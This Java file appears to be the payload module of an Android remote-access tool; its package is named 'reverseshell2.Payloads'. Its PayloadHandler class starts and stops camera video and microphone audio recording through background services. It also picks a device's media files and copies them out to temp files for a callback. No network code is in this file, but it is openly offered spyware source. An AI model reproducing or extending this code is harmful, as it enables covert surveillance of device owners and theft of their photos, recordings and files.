package com.example.reverseshell2.Payloads;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Log;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.PickVisualMediaRequest;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.RequiresApi;
import androidx.core.content.ContextCompat;

import com.example.reverseshell2.FileManager;

import java.io.File;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PayloadHandler {
    private static final String TAG = "PayloadHandlerClass";
    private final Context context;
    private final Activity activity;
    private final FileManager fileManager;
    private final ExecutorService executor;
    private final Handler mainHandler;

    public PayloadHandler(Context context, Activity activity) {
        this.context = context;
        this.activity = activity;
        this.fileManager = new FileManager(context, activity);
        this.executor = Executors.newCachedThreadPool();
        this.mainHandler = new Handler(Looper.getMainLooper());
    }

    public void startVideoRecording(int cameraId) {
        Intent serviceIntent = new Intent(context, videoRecorder.class);
        serviceIntent.putExtra("ins", "startFore");
        serviceIntent.putExtra("cameraid", String.valueOf(cameraId));
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(context, serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }

    public void stopVideoRecording() {
        Intent serviceIntent = new Intent(context, videoRecorder.class);
        serviceIntent.putExtra("ins", "stopFore");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(context, serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }

    public void startAudioRecording() {
        Intent serviceIntent = new Intent(context, audioManager.class);
        serviceIntent.putExtra("ins", "startFore");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(context, serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }

    public void stopAudioRecording() {
        Intent serviceIntent = new Intent(context, audioManager.class);
        serviceIntent.putExtra("ins", "stopFore");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(context, serviceIntent);
        } else {
            context.startService(serviceIntent);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    public void pickMediaFiles(ActivityResultLauncher<PickVisualMediaRequest> launcher) {
        mainHandler.post(() -> {
            fileManager.pickMediaWithPhotoPicker(launcher);
        });
    }

    public void handleMediaResult(Uri uri, PayloadCallback callback) {
        executor.execute(() -> {
            try {
                File tempFile = fileManager.createTempFile("media", ".tmp");
                fileManager.copyFile(uri, tempFile);
                mainHandler.post(() -> callback.onSuccess(tempFile));
            } catch (IOException e) {
                Log.e(TAG, "Error handling media result: " + e.getMessage());
                mainHandler.post(() -> callback.onError(e));
            }
        });
    }

    public interface PayloadCallback {
        void onSuccess(File result);
        void onError(Exception e);
    }

    public void cleanup() {
        executor.shutdownNow();
    }
}